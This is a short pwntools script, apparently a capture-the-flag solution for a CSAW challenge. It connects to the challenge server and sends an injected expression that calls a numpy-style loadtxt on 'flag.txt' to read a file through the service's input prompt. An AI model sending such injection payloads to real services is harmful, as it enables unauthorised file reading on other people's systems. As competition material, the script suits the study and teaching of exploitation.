#!/usr/bin/env python3

from pwn import *

r = remote("pwn.chal.csaw.io", 5011)

print(r.recvuntil(">>>"))
r.send('RMbPOQHCzt.loadtxt("flag.txt")\n')
print(r.recvline())
